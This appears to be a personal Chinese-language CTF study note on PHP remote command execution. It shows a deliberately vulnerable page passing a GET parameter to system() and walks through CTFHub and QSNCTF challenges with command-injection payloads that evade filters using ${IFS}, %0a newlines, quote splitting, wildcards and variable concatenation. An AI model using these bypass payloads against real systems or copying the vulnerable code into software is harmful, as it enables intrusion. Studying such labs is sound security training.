## RCE (远程命令执行)

## RCE(remote command/code execute ，远程命令执行)

命令执行一般发生在远程，故被称为远程命令执行。

```php
//一些可以命令执行的php参数
system("$a");
print shell_exec($a);
exec()
proc_open()
pcntl_exec()
```

简单构造一个站点:

```php
<?php
    $a=$_GET['cmd'];
if(isset($a)){
    system("$a");
}else{
    $a=phpinfo();
    echo $a;
}
?>
```

构造payload: `http://localhost/php/1.php?cmd=whoami`
返回: `never-x-10-ej\13461`

------

**CTFHUB实战**
1
显示了php源码 GET型 name是cmd 尝试RCE：
`?cmd=system("whoami")` 	可以执行 那就先找flag的位置
`?cmd=system("ls /")` 		查看根目录文件 发现文件flag_25583 打开文件
`?cmd=system("cat /flag_25583")` 拿到flag

------

2
![image-20231027155003540](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027155003540.png)

![image-20231027155031043](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027155031043.png)

那么我们可以构造一下: `127.0.0.1;ls`

```php
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 21801987819070.php
    [2] => index.php
)
```

21801987819070.php 这个文件我们很感兴趣 cat一下: `127.0.0.1;cat 21801987819070.php`
![image-20231027155158120](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027155158120.png)
拿到FLAG

------

3
过滤了cat的RCE
![image-20231027155550008](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027155550008.png)

PAYLOAD：

```php
127.0.0.1;ca""t flag_30172621528606.php
127.0|less flag_30172621528606.php    
127.0|more flag_30172621528606.php
```

![image-20231027155833634](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027155833634.png)


------

4
过滤了空格的RCE
文件是	flag_2385202442023.php

```php
127.01sd|cat<flag_2385202442023.php
Array
(
    [0] => <?php // ctfhub{c5abd191b780c231d4aec631}
)
```

```php
127.01sd|cat${IFS}flag_2385202442023.php
```

![image-20231027161352979](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027161352979.png)

### 一些绕过空格的方式

```

${IFS}$9
{IFS}
$IFS
${IFS}                                  			 1
$IFS$1 //$1改成$加其他数字貌似都行        				1
IFS       
< 									 			  1
<> 
{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
%20   (space)
%09   (tab)
X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）
```

------

5
过滤了目录符的RCE
PAYLOAD:

```php
;ls
[1] => flag_is_here
127.0.0.1;cd flag_is_here;ls
[1] => flag_2411685810477.php
127.0.0.1;cd flag_is_here;cat flag_2411685810477.php
```

![image-20231027165027740](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027165027740.png)

------

6
过滤了字符的RCE 
`if (!preg_match_all("/(\||\&)/", $ip, $m)) {`

```php
flag_237961634527128.php
;cat flag_237961634527128.php
```

![image-20231027170309251](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027170309251.png)

------

7
综合过滤练习:

```php
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
```

看到过滤了很多 但是还是可以绕过:

```php
?ip=127.0.0.1%0als#
//利用%0a 代替换行符绕过分号
看到 flag_is_here 目录
?ip=127.0.0.1%0acd${IFS}f*_is_here%0als  		
//注意这边的flag被replace了 所以可以用通配符f*自动查找
?ip=127.0.0.1%0acd${IFS}f*_is_here%0aless${IFS}fla*_6665323331831.php
```

![image-20231027172031725](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027172031725.png)

**过滤了/:**
`cd$IFS$1..;` 进入上一级目录 
`cd$IFS$1..;cd$IFS$1..;cd$IFS$1..;ls`

------

## QSNCTF 	real_ez_rce

说是简单其实特别难 （2023/10/27 21:49:38 花了三十分钟做出来这这道题....）

```
ls
flag.php index.php //只有两个文件
```

发现空格被过滤了 使用`$IFS$9`绕过空格 先查看index.php的源码 找找过滤方式:

```php
<?php
    error_reporting(0);
header("content-type:text/html;charset=utf-8");
if(isset($_POST['command'])){
    $command = $_POST['command'];
    if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $command, $match)){
        echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $command, $match);
        die("hacker! no symbol!");
    } else if(preg_match("/ /", $command)){
        die("hacker! no space!");
    } else if(preg_match("/bash/", $command)){
        die("hacker! no bash!");
    } else if(preg_match("/.*f.*l.*a.*g.*/", $command)){
        die("hacker! no flag!");
    }
    $a=shell_exec($command);
    print_r($a);
}
```

发现过滤了 空格 bash 所有flag的拼接方式 通配符 <>符号 {} [] / | 全被过滤了
先看看flag.php是不是最后的目标 查看所有路径:

```shell
//由于过滤的很严格 所以要一定技巧绕过 PAYLOAD
cd$IFS$9..;ls
cd$IFS$9..;cd$IFS$9..;ls
cd$IFS$9..;cd$IFS$9..;cd$IFS$9..;ls
发现就只有flag.php 所以我们把重点放在flag.php上
```

尝试cat:

```shell
cat$IFS$9f*.php
1hacker! no symbol!
```

### [重点]这里我们可以用字符串拼接的方式来绕过

```shell
a=ag;cat$IFS$9fl$a.php
```

ctrl + u 查看源代码 拿到flag ![image-20231027215659317](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027215659317.png)

------



















